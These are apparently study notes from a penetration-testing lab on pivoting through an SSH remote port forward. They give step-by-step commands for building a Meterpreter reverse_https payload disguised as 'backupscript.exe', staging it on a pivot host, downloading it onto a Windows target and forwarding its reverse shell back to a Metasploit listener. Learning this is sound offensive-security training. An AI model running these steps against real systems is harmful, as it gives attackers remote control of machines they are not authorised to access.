# Remote/Reverse Port Forwarding with SSH


![](Security%20Notes/Assets/Pasted%20image%2020220801200400.png)


## Problem
If we use Host A to pivot to Host B, we cannot get a reverse shell from host B to to attacker machine since Host B  is on the internal network and does not have a route to attacking machine

## Solution
To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.


### Step 0
Connect using ssh
`ssh -D <socks port> <user>@<ip>`

### Step 1
` msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

### Step 2
(without proxychains)
`use /exploit/multi/handler`
`lport=8000, lhost=0.0.0.0`

### Step 3
Transfer payload to pivot host
`scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`

### Step 4
Start python3 webserver on Pivot host to send the file
`python3 -m http.server 8123`

### Step 5 
Download payload on windows target
`Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`

### Step 6

**SSH Remote port forwarding**
` ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
`-vN` verbose and don't prompt login shell
`-R` The -R command asks the Ubuntu server to listen on targetIPaddress:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
